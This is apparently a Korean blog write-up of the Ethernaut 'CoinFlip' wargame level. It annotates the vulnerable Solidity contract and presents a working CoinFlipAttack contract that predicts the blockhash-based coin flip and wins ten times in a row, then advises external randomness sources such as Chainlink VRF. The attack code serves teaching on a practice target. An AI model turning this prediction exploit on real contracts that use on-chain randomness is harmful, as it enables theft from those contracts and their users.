---
emoji: 🧢
title: (Ethernaut 취약점 3) CoinFlip  
date: '2022-01-06 02:32:00'
author: 한성원
tags: ethernaut CoinFlip vulnerability
categories: 취약점분석
---


# 👋 1. CoinFlip
__Difficulty 3/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- 동전 뒤집기 게임에서 10번 연속 예측 성공하기

- - -

## 코드 분석
분석은 주석에!

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  // 연속 win의 수
  uint256 public consecutiveWins;
  // 이전 flip()에 사용됐던 hash 값 
  uint256 lastHash;
  // 난수 생성을 위한 값
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  
  //constructor: consecutiveWins 초기 값을 0으로 setting
  constructor() public {
    consecutiveWins = 0;
  }

  //동전 뒤집기 예측을 위한 function
  //return boolean
  function flip(bool _guess) public returns (bool) {
    // blockValue에 last blockhash를 uint256으로 casting해 저장한다
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    //만약 이전 게임에서 사용했던 hash라면 답이 같을 수 있음으로 revert한다
    if (lastHash == blockValue) {
      revert();
    }
    
    // 이번 게임에서 사용 될 hash를 저장
    lastHash = blockValue;
    //blockValue를 FACTOR로 나눈 값을 coinFilip에 저장한다.
    uint256 coinFlip = blockValue.div(FACTOR);
    // coinFlip의 숫자와 1이 같으면 side에 true, 다르면 false를 저장한다.
    bool side = coinFlip == 1 ? true : false;

    // 만약 side와 _guess가 같다면 실행, 즉 user의 예측이 맞았다면 실행
    if (side == _guess) {
      // 연속 win의 수에 1을 더한다
      consecutiveWins++;
      return true;
    } 
    // 만약 side와 _guess가 다르다면 실행, 즉 user의 예측이 틀렸다면 실행
    else {
      // 연속 win의 수를 초기화 시킨다.
      consecutiveWins = 0;
      return false;
    }
  }
}
```
- - -

### 풀이를 위한 Setup
[RemixIDE](https://remix.ethereum.org)를 사용한다. 
remix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!
그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.

한 가지 주의할 점은 CoinFlip은 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.
또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 "Injected Web3"를 선택해주어야 한다.


## 풀이
이 문제는 random으로 생성되는 값을 연속해서 맞추는 것이다.
그리고 이 문제에서 주목해야 할 점은 randomness이다.

solidity를 사용하여 randomness를 생성하는 것은 매우 까다롭고 대부분의 방법은 hacking 당하기 쉽다. 그래서 randomness를 생성하는 곳을 파고들어야 한다.

이 CoinFlip contract에서는 미리 정해진 FACTOR과 이전 block의 hash를 사용하여 randomness를 생성한다.

blockhash의 특징은 무엇일까? 우선 blockhash는 트랜잭션이 추가된 block의 hash 값이다. 즉 같은 block에 있는 transaction은 같은 blockhash를 가진다.

그렇다면 우리가 같은 block에 transaction을 보낸다면 해킹이 가능 할 것이다!

나는 그래서 CoinFlipAttack contract를 새로 만들었다. 

주석을 통해 CoinFlipAttack contract를 같이 분석 해보자!
```solidity
//아마 위해서 본 CoinFlip contract와 매우 비슷할 것이다.
contract CoinFlipAttack {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 public lastHash;
  // CoinFlip.flip()의 결과를 예측하기 위해 같은 FACTOR를 쓴다.
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  //CoinFlip contract의 address
  address coinFlipAddress;

  //contructor: 배포시 CoinFlip의 address를 포함해 배포한다.
  constructor(address _coinFlipAddress) public {
    consecutiveWins = 0;
    //coinFlipAddress를 CoinFlip의 address로 설정한다.
    coinFlipAddress = _coinFlipAddress;
  }

  function flip() public {
    //CounFlip contract와 똑같이 blockValue를 생성한다.
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    //CounFlip contract와 똑같이 conFlip 값을 생성한다.
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    이미 맞춘 값을 CoinFlip.flip에 보내 해킹한다.
    CoinFlip(coinFlipAddress).flip(side);

  }
}

```

즉 CoinFlipAttack.flip()을 다른 블록에 10번 call하면 해킹에 성공하게 된다.


완료 후 Submit instance를 누르고 조금 기다리면 block이 mine되고,
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```

- - -
## 마무리
solidity에서 randomness를 생성하는 것은 까다롭다. block.timestamp, block.hash등을 사용할 수 있지만 이는 모두 예측이 가능하다. 그래서 contract에서 randomness를 생성하는 것이 아니라 외부에 가져오는 것이 좋다. Openzeppline에서는 Chainlink VRF, RANDAO, Oraclize를 사용하는 것을 권장하고 있다. 앞으로 randomness를 만들때 조심하자! 

- - -
## 기타 정보
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org
```toc

```